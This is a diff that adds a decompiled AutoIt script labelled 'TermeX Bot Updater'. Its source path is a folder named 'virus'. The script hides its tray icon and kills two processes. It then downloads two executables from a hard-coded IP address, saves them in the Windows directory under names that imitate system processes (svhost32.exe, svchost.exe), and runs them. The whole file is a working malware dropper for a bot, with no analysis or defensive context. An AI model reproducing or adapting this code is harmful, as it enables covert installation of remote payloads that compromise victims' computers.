@@ -1,0 +1,27 @@
+; <AUT2EXE VERSION: 3.2.0.1>
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: D:\virus\updt.au3>
+; ----------------------------------------------------------------------------
+
+;---------------------------------------------------------------
+; Author : TermeX - ThanatoS
+; Name: TermeX Bot Updater
+; Version : 4.0
+; Usage : Updater for TermeX Bot
+; Published : 05 July 2007
+;---------------------------------------------------------------
+
+#NoTrayIcon
+$download = "http://64.26.25.75"
+ProcessClose("zin.exe")
+ProcessClose("zun.exe")
+InetGet ("" & $download & "/zin.exe", @WindowsDir & "\svhost32.exe", 1, 0)
+Run(@WindowsDir & "\svhost32.exe")
+InetGet ("" & $download & "/zun.exe", @WindowsDir & "\svchost.exe", 1, 0)
+Run(@WindowsDir & "\svchost.exe")
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: D:\virus\updt.au3>
+; ----------------------------------------------------------------------------
+
